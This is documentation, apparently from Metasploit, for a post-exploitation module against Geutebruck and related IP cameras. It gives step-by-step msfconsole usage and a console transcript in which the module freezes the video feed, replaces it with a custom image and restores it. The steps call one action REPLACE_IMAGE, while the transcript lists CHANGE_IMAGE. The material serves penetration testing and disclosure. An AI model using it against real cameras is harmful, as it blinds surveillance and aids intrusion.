## Vulnerable Application

The following [Geutebruck](https://www.geutebrueck.com) products using firmware versions <= 1.12.0.27,
firmware version 1.12.13.2 or firmware version 1.12.14.5:

* Encoder and E2 Series Camera models:
  * G-Code:
    * EEC-2xxx
  * G-Cam:
    * EBC-21xx
    * EFD-22xx
    * ETHC-22xx
    * EWPC-22xx

Many brands use the same firmware:

  * UDP Technology (which is also the supplier of the firmware for the other vendors)
  * Ganz
  * Visualint
  * Cap
  * THRIVE Intelligence
  * Sophus
  * VCA
  * TripCorps
  * Sprinx Technologies
  * Smartec
  * Riva

This module has been tested on a Geutebruck 5.02024 G-Cam EFD-2250 running the latest firmware version 1.12.0.27.

### Description

This module will take an existing session on a vulnerable Geutebruck Camera and will allow the user to either
freeze the camera and display the last image from the video stream, display an image on the camera, or restore
 the camera back to displaying the current feed/stream.

Users can find additional details of the related vulnerabilities on the
blogpost page at https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/.

## Verification Steps
### Freezing camera stream on the current image
  1. Launch `msfconsole`
  2. Get a shell using one of the published Getebruck exploits
  3. Do: `use post/linux/manage/geutebruck_post_exp`
  4. Do: `set SESSION <session number of the Geutebruck shell>`
  5. Do: `set action FREEZE_CAMERA`
  6. Do: `run`
  7. The image should be frozen

### Replacing camera stream with a custom image
  1. Launch `msfconsole`
  2. Get a shell using one of the published Getebruck exploits
  3. Do: `use post/linux/manage/geutebruck_post_exp`
  4. Do: `set SESSION <session number of the Geutebruck shell>`
  5. Do: `set action REPLACE_IMAGE`
  6. Do: `set IMAGE /local/image/path/to/upload`
  7. Do: `run`
  8. The image should be replaced by the custom one

### Restoring the current camera stream
  1. Launch `msfconsole`
  2. Get a shell using one of the published Getebruck exploits
  3. Do: `use post/linux/manage/geutebruck_post_exp`
  4. Do: `set SESSION <session number of the Geutebruck shell>`
  5. Do: `set action RESUME_STREAM`
  6. Do: `run`
  7. The stream should be resumed

## Scenarios
### Geutebruck 5.02024 G-Cam EFD-2250 running firmware version 1.12.0.27.
```
msf6 > use post/linux/manage/geutebruck_post_exp
msf6 post(linux/manage/geutebruck_post_exp) > show options

Module options (post/linux/manage/geutebruck_post_exp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   IMAGE                     no        Full path to the local copy of the image to upload
   SESSION                   yes       The session to run this module on.


Post action:

   Name           Description
   ----           -----------
   FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream


msf6 post(linux/manage/geutebruck_post_exp) > show actions

Post actions:

   Name           Description
   ----           -----------
   CHANGE_IMAGE   Display an arbitrary image instead of the video stream
   FREEZE_CAMERA  Freeze the camera and display the last image taken from the video stream
   RESUME_STREAM  Resume the camera's video stream and display the current live feed

msf6 post(linux/manage/geutebruck_post_exp) > set IMAGE /var/randori.jpg
IMAGE => /var/randori.jpg
msf6 post(linux/manage/geutebruck_post_exp) > set action CHANGE_IMAGE
action => CHANGE_IMAGE
msf6 post(linux/manage/geutebruck_post_exp) > set session 1
session => 1
msf6 post(linux/manage/geutebruck_post_exp) > run

[!] SESSION may not be compatible with this module.
[*] -- Starting action --
[*] Uploading a custom image...
[*] Backing up the original main.js...
[*] Using the new main.js...
[*] Done! The stream should be replaced by your image!
[*] Post module execution completed
msf6 post(linux/manage/geutebruck_post_exp) > set action FREEZE_CAMERA
action => FREEZE_CAMERA
msf6 post(linux/manage/geutebruck_post_exp) > run

[!] SESSION may not be compatible with this module.
[*] -- Starting action --
[*] Taking a snapshot of the current stream to use as the static image to freeze the stream on...
[*] Freezing the stream on the captured image...
[*] Backing up the original main.js...
[*] Using the new main.js...
[*] Stream frozen!
[*] Post module execution completed
msf6 post(linux/manage/geutebruck_post_exp) > set action RESUME_STREAM
action => RESUME_STREAM
msf6 post(linux/manage/geutebruck_post_exp) > run

[!] SESSION may not be compatible with this module.
[*] -- Starting action --
[*] Resuming stream...
[*] Restoring main.js backup...
[*] Restored! Stream back to a normal state.
[*] Post module execution completed
```